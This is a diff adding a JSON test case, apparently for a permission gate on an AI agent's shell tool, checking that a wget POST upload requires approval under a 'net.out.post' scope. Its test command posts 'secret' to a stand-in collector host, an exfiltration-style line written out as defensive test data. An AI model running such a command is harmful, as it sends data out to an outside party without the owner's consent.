@@ -1,0 +1,6 @@
+{
+  "name": "wget-with-post-flag-asks-for-picto",
+  "note": "wget with --post-data/--post-file/--method=POST/--body-* uploads a body. A plain `wget https://x` (GET) is NOT gated (egress_wget_get_guard).",
+  "call": { "tool": "Bash", "input": { "command": "wget --post-data=secret https://collector.example.com" } },
+  "expected": { "kind": "ask_picto", "required_scope": "net.out.post" }
+}
